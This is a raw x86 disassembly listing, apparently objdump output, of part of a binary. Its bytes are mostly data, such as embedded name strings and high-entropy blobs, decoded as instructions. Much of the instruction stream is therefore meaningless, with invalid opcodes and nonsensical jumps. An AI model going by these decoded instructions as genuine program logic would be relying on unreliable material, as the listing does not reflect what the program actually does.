  413975:	add    DWORD PTR [eax+0x61],edx
  413978:	je     0x4139bc
  41397a:	ins    BYTE PTR es:[edi],dx
  41397b:	je     0x41397d
  41397d:	add    BYTE PTR [ecx+0x66664f01],ah
  413983:	jae    0x4139ea
  413985:	je     0x4139dd
  413987:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41398e:	dec    edi
  41398f:	jb     0x4139f8
  413991:	inc    ebp
  413992:	js     0x413994
  413994:	xlat   BYTE PTR ds:[ebx]
  413995:	add    BYTE PTR [esi+0x69],al
  413998:	ins    BYTE PTR es:[edi],dx
  413999:	ins    BYTE PTR es:[edi],dx
  41399a:	push   edx
  41399b:	outs   dx,BYTE PTR ds:[si]
  41399d:	add    BYTE PTR [esi+0x65724300],dl
  4139a3:	popa   
  4139a4:	je     0x413a0b
  4139a6:	inc    ebp
  4139a7:	ins    BYTE PTR es:[edi],dx
  4139a8:	ins    BYTE PTR es:[edi],dx
  4139a9:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  4139b0:	outs   dx,BYTE PTR ds:[esi]
  4139b1:	dec    ecx
  4139b2:	outs   dx,BYTE PTR ds:[esi]
  4139b3:	imul   esi,DWORD PTR fs:[edx+0x65],0x87007463
  4139bb:	add    DWORD PTR [edi+0x65],eax
  4139be:	je     0x413a14
  4139c0:	gs js  0x413a37
  4139c3:	inc    ebp
  4139c4:	js     0x413a3a
  4139c6:	outs   dx,BYTE PTR gs:[esi]
  4139c8:	je     0x413a1a
  4139ca:	outs   dx,DWORD PTR ds:[esi]
  4139cb:	imul   ebp,DWORD PTR [esi+0x74],0x1c40057
  4139d2:	push   edx
  4139d3:	gs jae 0x413a3f
  4139d6:	jp     0x413a3d
  4139d8:	push   eax
  4139d9:	popa   
  4139da:	ins    BYTE PTR es:[edi],dx
  4139db:	gs je  0x413a52
  4139de:	gs add bh,dl
  4139e1:	add    DWORD PTR [ebx+0x65],edx
  4139e4:	je     0x413a28
  4139e6:	jb     0x413a5d
  4139e8:	jae    0x413a52
  4139ea:	dec    edi
  4139eb:	jb     0x413a54
  4139ed:	inc    ebp
  4139ee:	js     0x4139f0
  4139f0:	mov    al,ds:0x66664f01
  4139f5:	jae    0x413a5c
  4139f7:	je     0x413a4b
  4139f9:	outs   dx,BYTE PTR ds:[si]
  4139fb:	add    BYTE PTR [ebx],cl
  4139fd:	add    dl,BYTE PTR [ebp+eiz*2+0x78]
  413a01:	je     0x413a52
  413a03:	jne    0x413a79
  413a05:	inc    ecx
  413a06:	add    BYTE PTR [eax],al
  413a08:	mov    eax,0x61655201
  413a0d:	ins    BYTE PTR es:[edi],dx
  413a0e:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  413a15:	je     0x413a8b
  413a17:	add    BYTE PTR gs:[eax],al
  413a1a:	inc    edi
  413a1b:	inc    esp
  413a1c:	dec    ecx
  413a1d:	xor    esi,DWORD PTR [edx]
  413a1f:	cs fs ins BYTE PTR es:[edi],dx
  413a22:	ins    BYTE PTR es:[edi],dx
  413a23:	add    BYTE PTR [esi+0x0],al
  413a26:	push   eax
  413a27:	popa   
  413a28:	je     0x413a92
  413a2a:	inc    esi
  413a2b:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413a32:	outs   dx,BYTE PTR ds:[esi]
  413a33:	jae    0x413a9e
  413a35:	outs   dx,DWORD PTR ds:[esi]
  413a36:	outs   dx,BYTE PTR ds:[esi]
  413a37:	inc    ecx
  413a38:	add    BYTE PTR [eax],al
  413a3a:	push   ebx
  413a3b:	dec    eax
  413a3c:	dec    esp
  413a3d:	push   edi
  413a3e:	inc    ecx
  413a3f:	push   eax
  413a40:	dec    ecx
  413a41:	cs fs ins BYTE PTR es:[edi],dx
  413a44:	ins    BYTE PTR es:[edi],dx
  413a45:	add    BYTE PTR [ebp+0x6b],dh
  413a48:	popa   
  413a49:	jns    0x413a90
  413a4b:	pop    ecx
  413a4c:	je     0x413a96
  413a4e:	push   edx
  413a4f:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413a56:	call   0x413e:0xa200413e
  413a5d:	add    BYTE PTR [esi-0x17ffbec4],bl
  413a63:	or     esi,DWORD PTR [edx-0x3db086f2]
  413a69:	dec    esi
  413a6a:	ja     0x413abb
  413a6c:	cmp    eax,0x384f4f4f
  413a71:	dec    edi
  413a72:	jp     0x413ac3
  413a74:	cmp    ecx,DWORD PTR [edi+0x5e]
  413a77:	dec    edi
  413a78:	ss dec edi
  413a7a:	add    ecx,DWORD PTR [edi+0x31]
  413a7d:	dec    edi
  413a7e:	ret    0x324e
  413a81:	dec    edi
  413a82:	push   ds
  413a83:	push   edx
  413a84:	pop    ds
  413a85:	push   ebx
  413a86:	cmp    DWORD PTR [edi+0x79],ecx
  413a89:	dec    edi
  413a8a:	ret    0x774e
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x384f4f4f
  413a93:	dec    edi
  413a94:	jp     0x413ae5
  413a96:	cmp    ecx,DWORD PTR [edi+0x5e]
  413a99:	dec    edi
  413a9a:	ss dec edi
  413a9c:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  413aa3:	dec    edi
  413aa4:	push   ds
  413aa5:	bound  ebx,QWORD PTR [edi]
  413aa7:	arpl   WORD PTR [ecx],di
  413aa9:	dec    edi
  413aaa:	jns    0x413afb
  413aac:	ret    0x724e
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f034f
  413ab5:	dec    edi
  413ab6:	dec    esp
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	jb     0x413ae0
  413ac1:	jae    0x413ad2
  413ac3:	or     DWORD PTR [eax],0xffffff80
  413ac6:	js     0x413a58
  413ac8:	jns    0x413a5b
  413aca:	aas    
  413acb:	dec    edi
  413acc:	jbe    0x413b1d
  413ace:	ret    0x764e
  413ad1:	dec    edi
  413ad2:	ds dec edi
  413ad4:	dec    esp
  413ad5:	dec    edi
  413ad6:	cmp    DWORD PTR [edi+0x3],ecx
  413ad9:	dec    edi
  413ada:	xor    eax,0x364ec24f
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	sbb    BYTE PTR [edi],0x83
  413ae4:	setae  BYTE PTR [eax]
  413ae7:	nop
  413ae8:	js     0x413a8a
  413aea:	jns    0x413a8d
  413aec:	aas    
  413aed:	dec    edi
  413aee:	jbe    0x413b3f
  413af0:	ret    0x764e
  413af3:	dec    edi
  413af4:	ds dec edi
  413af6:	dec    esp
  413af7:	dec    edi
  413af8:	cmp    DWORD PTR [edi+0x69],ecx
  413afb:	dec    edi
  413afc:	xor    eax,0x364ec24f
  413b01:	dec    edi
  413b02:	push   ds
  413b03:	xchg   edx,eax
  413b04:	pop    ds
  413b05:	xchg   ebx,eax
  413b06:	bt     DWORD PTR [eax],ecx
  413b09:	mov    al,ds:0xb179b078
  413b0e:	aas    
  413b0f:	dec    edi
  413b10:	push   0x4e4ec24f
  413b15:	dec    edi
  413b16:	cmp    eax,0x394f034f
  413b1b:	dec    edi
  413b1c:	push   ecx
  413b1d:	dec    edi
  413b1e:	xor    al,0x4f
  413b20:	ret    0x364e
  413b23:	dec    edi
  413b24:	push   ds
  413b25:	mov    ds:0xb30fa31f,al
  413b2a:	or     BYTE PTR [eax-0x3e863f88],dh
  413b30:	aas    
  413b31:	dec    edi
  413b32:	push   0x4e4ec24f
  413b37:	dec    edi
  413b38:	cmp    eax,0x394f784f
  413b3d:	dec    edi
  413b3e:	pop    edi
  413b3f:	dec    edi
  413b40:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b43:	dec    esi
  413b44:	xor    eax,0x1fb21e4f
  413b49:	mov    bl,0xf
  413b4b:	ret    
  413b4c:	or     al,al
  413b4e:	js     0x413b20
  413b50:	jns    0x413b23
  413b52:	aas    
  413b53:	dec    edi
  413b54:	push   0x4e4ec24f
  413b59:	dec    edi
  413b5a:	cmp    eax,0x394f724f
  413b5f:	dec    edi
  413b60:	dec    esi
  413b61:	dec    edi
  413b62:	xor    al,0x4f
  413b64:	ret    0x304e
  413b67:	dec    edi
  413b68:	push   ds
  413b69:	ret    0xc31f
  413b6c:	psrlq  mm1,QWORD PTR [eax]
  413b6f:	sar    BYTE PTR [eax-0x20],1
  413b72:	jns    0x413b55
  413b74:	aas    
  413b75:	dec    edi
  413b76:	push   0x4e4ec24f
  413b7b:	dec    edi
  413b7c:	cmp    eax,0x394f734f
  413b81:	dec    edi
  413b82:	dec    esp
  413b83:	dec    edi
  413b84:	xor    al,0x4f
  413b86:	ret    0x364e
  413b89:	dec    edi
  413b8a:	push   ds
  413b8b:	rcr    BYTE PTR [edi],cl
  413b8d:	ror    DWORD PTR [edi],cl
  413b8f:	jecxz  0x413b99
  413b91:	loopne 0x413c0b
  413b93:	lock jns 0x413b87
  413b96:	aas    
  413b97:	dec    edi
  413b98:	ins    DWORD PTR es:[edi],dx
  413b99:	dec    edi
  413b9a:	ret    0x5f4e
  413b9d:	dec    edi
  413b9e:	cmp    eax,0x3e4f524f
  413ba3:	dec    edi
  413ba4:	ret    0x3f4e
  413ba7:	dec    edi
  413ba8:	push   ds
  413ba9:	loop   0x413bca
  413bab:	jecxz  0x413bbc
  413bad:	repz or al,dh
  413bb0:	js     0x413bb2
  413bb2:	jns    0x413bb5
  413bb4:	js     0x413bc6
  413bb6:	jns    0x413bc9
  413bb8:	ds dec edi
  413bba:	jg     0x413c0b
  413bbc:	ret    0x5b4e
  413bbf:	dec    edi
  413bc0:	cmp    al,0x4f
  413bc2:	jb     0x413c13
  413bc4:	ds dec edi
  413bc6:	dec    ebp
  413bc7:	dec    edi
  413bc8:	cmp    ecx,DWORD PTR [edi-0x3e]
  413bcb:	dec    esi
  413bcc:	xor    eax,0x1f021e4f
  413bd1:	add    ecx,DWORD PTR [edi]
  413bd3:	adc    ecx,DWORD PTR [eax]
  413bd5:	adc    BYTE PTR [eax+0x20],bh
  413bd8:	jns    0x413bfb
  413bda:	aas    
  413bdb:	dec    edi
  413bdc:	add    BYTE PTR [eax],al
  413bde:	data16 cmp al,BYTE PTR [ecx+0x0]
  413be2:	pop    edx
  413be3:	cmp    al,0x41
  413be5:	add    BYTE PTR [edx+0x3c],ah
  413be8:	inc    ecx
  413be9:	add    BYTE PTR [esi+0xe00413e],ah
  413bef:	ds inc ecx
  413bf1:	add    BYTE PTR [esi+0x4200413e],dl
  413bf7:	cmp    al,0x41
  413bf9:	add    BYTE PTR [esi+0x3c],al
  413bfc:	inc    ecx
  413bfd:	add    BYTE PTR [esi-0x55ffbec2],cl
  413c03:	cmp    al,0x41
  413c05:	add    BYTE PTR [edx-0x4e076357],cl
  413c0b:	mov    edx,0x3c5ef89c
  413c10:	inc    ecx
  413c11:	add    dh,al
  413c13:	cmp    eax,0x3dda0041
  413c18:	inc    ecx
  413c19:	add    dh,ah
  413c1b:	cmp    eax,0x3df60041
  413c20:	inc    ecx
  413c21:	add    BYTE PTR [esi+0x6200413c],dl
  413c27:	cmp    al,BYTE PTR [ecx+0x0]
  413c2a:	mov    dh,0x3c
  413c2c:	inc    ecx
  413c2d:	add    BYTE PTR [esi-0x55ffbec4],ah
  413c33:	ds inc ecx
  413c35:	add    BYTE PTR [ecx],dh
  413c37:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413c3e:	push   0x3c
  413c40:	inc    ecx
  413c41:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413c47:	or     eax,0x705
  413c4c:	inc    eax
  413c4d:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413c51:	fisttp QWORD PTR [ebx]
  413c53:	ss inc ebx
  413c55:	add    BYTE PTR [edx+0x68],dh
  413c58:	inc    ebp
  413c59:	inc    ecx
  413c5a:	(bad)  
  413c5b:	cli    
  413c5c:	jne    0x413cc0
  413c5e:	(bad)  
  413c5f:	in     eax,dx
  413c60:	inc    BYTE PTR [edi]
  413c62:	mov    eax,0x5205a3fa
  413c67:	cmp    al,0x41
  413c69:	add    BYTE PTR [edx],dh
  413c6b:	xchg   ebp,eax
  413c6c:	pushf  
  413c6d:	clc    
  413c6e:	xor    dl,BYTE PTR [esi-0x6acc0764]
  413c74:	pushf  
  413c75:	clc    
  413c76:	cmp    al,0x95
  413c78:	pushf  
  413c79:	clc    
  413c7a:	cmp    eax,0x3ef89c95
  413c7f:	xchg   ebp,eax
  413c80:	pushf  
  413c81:	clc    
  413c82:	aas    
  413c83:	xchg   ebp,eax
  413c84:	pushf  
  413c85:	clc    
  413c86:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413c8c:	pushf  
  413c8d:	clc    
  413c8e:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413c94:	pushf  
  413c95:	clc    
  413c96:	in     eax,dx
  413c97:	stc    
  413c98:	add    esp,DWORD PTR [eax+0x5a]
  413c9b:	cmp    al,BYTE PTR [ecx+0x0]
  413c9e:	(bad)  
  413c9f:	add    BYTE PTR [ebx+0x0],al
  413ca2:	pop    ecx
  413ca3:	dec    ecx
  413ca4:	imul   si,WORD PTR [ecx],0xff85
  413ca8:	pushf  
  413ca9:	clc    
  413caa:	sahf   
  413cab:	jmp    0x5b54400
  413cb0:	add    BYTE PTR [eax],al
  413cb2:	push   esi
  413cb3:	cmp    al,BYTE PTR [ecx+0x0]
  413cb6:	pushf  
  413cb7:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413cea:	jecxz  0x413c7b
  413cec:	inc    eax
  413ced:	add    dh,bh
  413cef:	adc    BYTE PTR [ebx+0x0],al
  413cf2:	add    BYTE PTR [eax],al
  413cf4:	add    BYTE PTR [eax],al
  413cf6:	inc    esp
  413cf7:	add    BYTE PTR [esi+0x0],al
  413cfa:	imul   eax,DWORD PTR [eax],0x4a006f
  413d00:	dec    ecx
  413d01:	add    BYTE PTR [eax+eax*1+0x46],al
  413d05:	add    BYTE PTR [eax+eax*1+0x49],cl
  413d09:	add    BYTE PTR [ebp+0x0],dl
  413d0c:	inc    esi
  413d0d:	add    BYTE PTR [edi+0x0],cl
  413d10:	imul   eax,DWORD PTR [eax],0x6f
  413d13:	add    BYTE PTR [edx+0x0],ch
  413d16:	dec    ebx
  413d17:	add    BYTE PTR [eax+eax*1+0x66],cl
  413d1b:	add    BYTE PTR [edx+0x0],ch
  413d1e:	imul   eax,DWORD PTR [eax],0x46006f
  413d24:	jo     0x413d26
  413d26:	outs   dx,DWORD PTR ds:[esi]
  413d27:	add    BYTE PTR [ebx+0x0],ch
  413d2a:	ins    DWORD PTR es:[edi],dx
  413d2b:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413d2f:	add    BYTE PTR [ebx+0x0],dh
  413d32:	ins    BYTE PTR es:[edi],dx
  413d33:	add    BYTE PTR [edx+0x0],ch
  413d36:	data16 add BYTE PTR [edi+0x0],ah
  413d3a:	imul   eax,DWORD PTR [eax],0x64006f
  413d40:	add    BYTE PTR [di+0x0],dh
  413d44:	imul   eax,DWORD PTR [eax],0x69006a
  413d4a:	outs   dx,DWORD PTR ds:[esi]
  413d4b:	add    BYTE PTR [esi+0x0],ah
  413d4e:	add    BYTE PTR fs:[ebp+0x0],dh
  413d52:	push   0x0
  413d54:	add    BYTE PTR [bp+0x0],ah
  413d58:	add    BYTE PTR fs:[eax],al
  413d5b:	add    BYTE PTR [eax],al
  413d5d:	add    BYTE PTR [ebx+0x4a],cl
  413d60:	inc    esp
  413d61:	dec    esp
  413d62:	dec    edx
  413d63:	imul   ecx,DWORD PTR [ebx+ecx*2+0x49],0x55
  413d68:	inc    esp
  413d69:	dec    ecx
  413d6a:	dec    ecx
  413d6b:	inc    esp
  413d6c:	dec    edi
  413d6d:	jne    0x413dd3
  413d6f:	dec    ecx
  413d70:	dec    esp
  413d71:	push   ebp
  413d72:	imul   ebp,DWORD PTR fs:[edi+0x55],0x6a49444b
  413d7a:	imul   ebp,DWORD PTR [esp+eiz*2+0x4b],0x4a
  413d7f:	inc    esp
  413d80:	imul   ebp,DWORD PTR [esp+eax*2+0x4c],0x444a494b
  413d88:	ins    BYTE PTR es:[edi],dx
  413d89:	imul   ebp,DWORD PTR [edx+0x64],0x4c
  413d8d:	dec    ebx
  413d8e:	push   ebp
  413d8f:	inc    esp
  413d90:	outs   dx,DWORD PTR ds:[esi]
  413d91:	imul   esi,DWORD PTR [ebp+0x6a],0x4a6b6c64
  413d98:	dec    esp
  413d99:	dec    ebx
  413d9a:	inc    esp
  413d9b:	dec    edx
  413d9c:	dec    edi
  413d9d:	sub    al,BYTE PTR [ebp+edx*2+0x4c]
  413da1:	inc    esp
  413da2:	inc    esp
  413da3:	add    BYTE PTR [eax],al
  413da5:	add    BYTE PTR [esi+0x6b],ah
  413da8:	fs jae 0x413e12
  413dab:	addr16 data16 fs addr16 fs data16 addr16 data16 fs data16 add BYTE PTR fs:[bx+si],al
	...
  413dc1:	add    BYTE PTR [ecx+0x550040c0],bl
  413dc7:	dec    edi
  413dc8:	pop    edi
  413dc9:	dec    edi
  413dca:	dec    esp
  413dcb:	dec    edi
  413dcc:	push   eax
  413dcd:	dec    edi
  413dce:	pop    edi
  413dcf:	dec    edi
  413dd0:	push   esi
  413dd1:	dec    edi
  413dd2:	or     eax,0xc24f0c4f
  413dd7:	dec    esi
  413dd8:	add    BYTE PTR [eax],al
  413dda:	pop    ecx
  413ddb:	dec    edi
  413ddc:	pop    esi
  413ddd:	dec    edi
  413dde:	pop    ebx
  413ddf:	dec    edi
  413de0:	or     eax,0xc24f0c4f
  413de5:	dec    esi
  413de6:	dec    edi
  413de7:	dec    edi
  413de8:	dec    ebp
  413de9:	dec    edi
  413dea:	pop    edi
  413deb:	dec    edi
  413dec:	dec    esp
  413ded:	dec    edi
  413dee:	or     eax,0xc24f0c4f
  413df3:	dec    esi
  413df4:	add    BYTE PTR [eax],al
  413df6:	dec    ebp
  413df7:	dec    edi
  413df8:	pop    edx
  413df9:	dec    edi
  413dfa:	push   esi
  413dfb:	dec    edi
  413dfc:	dec    ecx
  413dfd:	dec    edi
  413dfe:	arpl   WORD PTR [edi+0x52],cx
  413e01:	dec    edi
  413e02:	pop    ebx
  413e03:	dec    edi
  413e04:	ret    0x4e
  413e07:	add    BYTE PTR [eax],al
  413e09:	add    BYTE PTR [eax],al
  413e0b:	add    BYTE PTR [eax],al
  413e0d:	add    BYTE PTR [esi+0x7d],ch
  413e10:	outs   dx,BYTE PTR ds:[esi]
  413e11:	lea    ebp,[esi-0x63]
  413e14:	outs   dx,BYTE PTR ds:[esi]
  413e15:	lods   eax,DWORD PTR ds:[esi]
  413e16:	outs   dx,BYTE PTR ds:[esi]
  413e17:	mov    ebp,0xdd6ecd6e
  413e1c:	outs   dx,BYTE PTR ds:[esi]
  413e1d:	in     eax,dx
  413e1e:	outs   dx,BYTE PTR ds:[esi]
  413e1f:	std    
  413e20:	outs   dx,BYTE PTR ds:[esi]
  413e21:	or     eax,0x2d6e1d6e
  413e26:	outs   dx,BYTE PTR ds:[esi]
  413e27:	cmp    eax,0x6d6e5d6e
  413e2c:	outs   dx,BYTE PTR ds:[esi]
  413e2d:	jb     0x413e9d
  413e2f:	jae    0x413e9f
  413e31:	jo     0x413ea1
  413e33:	jno    0x413ea3
  413e35:	jbe    0x413ea5
  413e37:	ja     0x413ea7
  413e39:	je     0x413ea9
  413e3b:	jne    0x413eab
  413e3d:	mov    ch,BYTE PTR [esi-0x75]
  413e40:	outs   dx,BYTE PTR ds:[esi]
  413e41:	mov    BYTE PTR [esi-0x77],ch
  413e44:	outs   dx,BYTE PTR ds:[esi]
  413e45:	mov    gs,WORD PTR [esi+0x7c]
  413e48:	pop    esi
  413e49:	jge    0x413e99
  413e4b:	jge    0x413e0b
  413e4d:	jge    0x413ea7
  413e4f:	(bad)  
  413e50:	jns    0x413ec2
  413e52:	mov    ecx,0x7d736eb1
  413e57:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413e5d:	add    BYTE PTR [ecx+0x17],cl
  413e60:	mov    ebx,0x4af4b956
  413e65:	aaa    
  413e66:	dec    edx
  413e67:	jle    0x413e02
  413e69:	jno    0x413ecb
  413e6b:	mov    cl,0x4
  413e6d:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413e74:	inc    esp
  413e75:	xlat   BYTE PTR ds:[ebx]
  413e76:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413e7c:	rcr    esi,cl
  413e7e:	(bad)  
  413e7f:	leave  
  413e80:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413e86:	fs icebp 
  413e88:	push   eax
  413e89:	(bad)  
  413e8a:	rcr    DWORD PTR [eax],1
  413e8c:	shl    DWORD PTR [ecx-0x11],1
  413e8f:	(bad)  [ebx+0x7]
  413e92:	mov    dl,0x3c
  413e94:	inc    ecx
  413e95:	add    BYTE PTR [esi+0x30],al
  413e98:	shl    DWORD PTR [ebx],0xb8
  413e9b:	and    DWORD PTR [ecx+0x0],eax
  413e9e:	inc    esi
  413e9f:	push   ebx
  413ea0:	outs   dx,DWORD PTR ds:[esi]
  413ea1:	push   ebx
  413ea2:	dec    edx
  413ea3:	cmp    al,0x41
  413ea5:	add    BYTE PTR [esi-0x70ffbec4],ch
  413eab:	in     eax,dx
  413eac:	adc    al,BYTE PTR [edi]
	...
  413ece:	inc    ecx
  413ecf:	inc    edi
  413ed0:	jae    0x413f3b
  413ed2:	inc    edx
  413ed3:	jae    0x413f3a
  413ed5:	popa   
  413ed6:	push   ecx
  413ed7:	pop    eax
  413ed8:	pop    ecx
  413ed9:	outs   dx,BYTE PTR ds:[esi]
  413eda:	jbe    0x413f54
  413edc:	jns    0x413f32
  413ede:	push   ecx
  413edf:	imul   ebp,DWORD PTR [ebx+0x74],0x61
  413ee3:	jns    0x413f34
  413ee5:	inc    ebx
  413ee6:	jo     0x413f5a
  413ee8:	data16 jp 0x413f3d
  413eeb:	jp     0x413f45
  413eed:	ins    BYTE PTR es:[edi],dx
  413eee:	je     0x413f5f
  413ef0:	jns    0x413f60
  413ef2:	popa   
  413ef3:	push   esi
  413ef4:	push   ebp
  413ef5:	push   0x0
	...
  413f0a:	popa   
  413f0b:	push   edi
  413f0c:	push   esi
  413f0d:	push   esp
  413f0e:	dec    eax
  413f0f:	je     0x413f5d
  413f11:	push   ebx
  413f12:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413f16:	push   esp
  413f17:	arpl   WORD PTR [ecx+0x4b],cx
  413f1a:	inc    edi
  413f1b:	jne    0x413f63
  413f1d:	push   ebx
  413f1e:	outs   dx,DWORD PTR ds:[esi]
  413f1f:	push   ebx
  413f20:	inc    esi
  413f21:	inc    edi
  413f22:	push   0x66495949
  413f27:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413f2b:	push   esi
  413f2c:	jb     0x413f96
  413f2e:	add    BYTE PTR [eax],al
  413f30:	js     0x413fa6
  413f32:	popa   
  413f33:	inc    ebx
  413f34:	push   ecx
  413f35:	ins    BYTE PTR es:[edi],dx
  413f36:	pop    eax
  413f37:	ja     0x413f86
  413f39:	je     0x413fb1
  413f3b:	add    BYTE PTR [ebp+0x7a],dl
  413f3e:	ins    BYTE PTR es:[edi],dx
  413f3f:	jb     0x413fba
  413f41:	inc    edi
  413f42:	push   edi
  413f43:	push   esi
  413f44:	inc    edi
  413f45:	ins    BYTE PTR es:[edi],dx
  413f46:	add    BYTE PTR [eax],al
  413f48:	jbe    0x413f8e
  413f4a:	push   esi
  413f4b:	push   edi
  413f4c:	dec    edx
  413f4d:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  413f54:	add    BYTE PTR [eax],al
  413f56:	in     al,0xf5
  413f58:	jnp    0x413fa8
  413f5a:	jnp    0x413f2a
  413f5c:	cmc    
  413f5d:	call   FWORD PTR [ebx+0x61]
  413f60:	and    bh,dl
  413f62:	add    al,0x38
  413f64:	fucomp st(2)
  413f66:	xlat   BYTE PTR ds:[bx]
  413f68:	add    BYTE PTR [eax],al
  413f6a:	add    BYTE PTR [ecx],al
  413f6c:	add    BYTE PTR [eax],al
  413f6e:	and    eax,DWORD PTR [edx-0x5]
  413f71:	pop    esp
  413f72:	repnz enter 0x24d4,0xfa
  413f77:	inc    ebx
  413f78:	popf   
  413f79:	bound  ebp,QWORD PTR [edx-0x2262b806]
  413f7f:	pop    ecx
  413f80:	out    dx,eax
  413f81:	clc    
  413f82:	(bad)  [esi+0x8855654]
  413f88:	(bad)
  413f8b:	xchg   DWORD PTR [ebx+0x4ffaf74],esp
  413f91:	repz add DWORD PTR [ecx-0x63],esp
  413f95:	and    eax,0x414bc365
  413f9a:	mov    al,ds:0xf29aadba
  413f9f:	call   FWORD PTR [ecx-0x37]
  413fa2:	dec    ebp
  413fa3:	fs cdq 
  413fa5:	sbb    DWORD PTR [esi-0x73],edi
  413fa8:	push   edi
  413fa9:	or     ebx,DWORD PTR [ebx]
  413fab:	cmp    DWORD PTR [edi+edi*8-0x73],ecx
  413faf:	jge    0x413f8b
  413fb1:	mov    ecx,0x9e9bec63
  413fb6:	add    eax,0xfb65d561
  413fbb:	aad    0x79
  413fbd:	iret   
  413fbe:	nop
  413fbf:	sahf   
  413fc0:	into   
  413fc1:	shr    DWORD PTR [edi],0xc1
  413fc4:	std    
  413fc5:	pop    esi
  413fc6:	xor    al,0xfb
  413fc8:	lds    ebx,FWORD PTR [ecx-0x5c]
  413fcb:	add    cl,BYTE PTR [ebx+0x7b]
  413fce:	xchg   DWORD PTR [esp+ecx*8-0x3816ae60],edi
  413fd5:	pushf  
  413fd6:	xor    ecx,DWORD PTR [esi-0x11]
  413fd9:	xor    eax,0xc82e5e32
  413fde:	mov    bh,0xf2
  413fe0:	mov    edx,0xce480da8
  413fe5:	jp     0x413fbc
  413fe7:	xchg   esi,eax
  413fe8:	jb     0x41403b
  413fea:	dec    esp
  413feb:	sub    ch,al
  413fed:	outs   dx,DWORD PTR ds:[esi]
  413fee:	mov    bl,0xf
  413ff0:	adc    eax,0x66c2b327
  413ff5:	mov    dl,0x33
  413ff7:	dec    esi
  413ff8:	fcom   DWORD PTR [ecx+ecx*4]
  413ffb:	iret   
  413ffc:	mov    ch,0xab
  413ffe:	inc    esp
  413fff:	out    dx,eax
  414000:	arpl   WORD PTR [ebp-0x4],di
  414003:	in     al,dx
  414004:	mov    ?,WORD PTR [ecx-0x154a5a64]
  41400a:	mov    edx,0xc614b428
  41400f:	repnz or bl,BYTE PTR [edi]
  414012:	and    ebp,edx
  414014:	out    0x8a,al
  414016:	sub    edx,DWORD PTR [ecx+0x77]
  414019:	pop    ecx
  41401a:	gs inc edi
  41401d:	pop    es
  41401e:	int    0x55
  414020:	inc    edx
  414021:	inc    ebp
  414022:	sub    edi,edi
  414024:	(bad)
  414027:	scas   eax,DWORD PTR es:[edi]
  414028:	test   DWORD PTR [esi],edi
  41402a:	int    0xa9
  41402c:	inc    ebp
  41402d:	xchg   esi,edi
  41402f:	push   ecx
  414030:	mov    al,ds:0x52b1a300
  414035:	dec    esp
  414036:	fwait
  414037:	addr16 mov al,ds:0x1539
  41403b:	movhps QWORD PTR [edi-0x5fb6be89],xmm5
  414042:	jns    0x413fca
  414044:	test   dh,ch
  414046:	xchg   edx,esp
  414048:	or     edx,eax
  41404a:	popa   
  41404b:	pop    ecx
  41404c:	dec    eax
  41404d:	lods   al,BYTE PTR ds:[esi]
  41404e:	xchg   edi,eax
  41404f:	daa    
  414050:	int    0x9e
  414052:	push   es
  414053:	push   0x4
  414055:	out    dx,eax
  414056:	mov    WORD PTR [edx-0x4a],ss
  414059:	fist   DWORD PTR [eax-0x49]
  41405c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41405d:	xchg   ebx,eax
  41405e:	or     ecx,DWORD PTR ds:0x3f94a025
  414064:	xchg   BYTE PTR [esi-0x40],bh
  414067:	sbb    al,0xf1
  414069:	pushf  
  41406a:	lea    ebp,[edi+eax*4+0x35]
	...
  4140d6:	pop    edx
  4140d7:	ficom  DWORD PTR [esi+0x60]
  4140da:	(bad)  
  4140db:	in     al,dx
  4140dc:	jle    0x4140d8
  4140de:	call   0xb09d:0x11d52e96
  4140e5:	dec    ebp
  4140e6:	fadd   DWORD PTR [bx+si]
  4140e9:	add    BYTE PTR [eax],al
  4140eb:	add    DWORD PTR [eax],eax
  4140ed:	add    BYTE PTR [edx-0xbee0218],dl
  4140f3:	sbb    eax,0x7a2b124d
  4140f8:	(bad)  
  4140f9:	cmp    BYTE PTR [edx+0x41],dl
  4140fc:	jo     0x41415c
  4140fe:	or     ebx,esi
  414100:	pop    esp
  414101:	adc    ah,BYTE PTR [edx]
  414103:	mov    ds:0xaf8f1967,al
  414108:	aad    0xe8
  41410a:	dec    esi
  41410b:	(bad)  
  41410c:	mov    ebx,0x9049e8e5
  414111:	nop
  414112:	inc    edi
  414113:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414114:	and    ecx,edi
  414116:	jo     0x4140cf
  414118:	sbb    al,0x98
  41411a:	fwait
  41411b:	popf   
  41411c:	dec    ecx
  41411d:	sahf   
  41411e:	adc    dh,al
  414120:	jo     0x414165
  414122:	sub    BYTE PTR [esi+0x2a58a7e2],cl
  414128:	jl     0x414139
  41412a:	inc    ebp
  41412b:	and    DWORD PTR ds:0x2f7150b3,eax
  414131:	into   
  414132:	push   es
  414133:	jno    0x414118
  414135:	out    dx,eax
  414136:	xor    edx,DWORD PTR [ebp-0x34192d14]
  41413c:	and    eax,DWORD PTR ds:0x7171193d
  414142:	mov    bl,0xb1
  414144:	add    DWORD PTR [esi],edi
  414146:	ficom  WORD PTR [esp+ebp*2]
  414149:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41414a:	stos   DWORD PTR es:[edi],eax
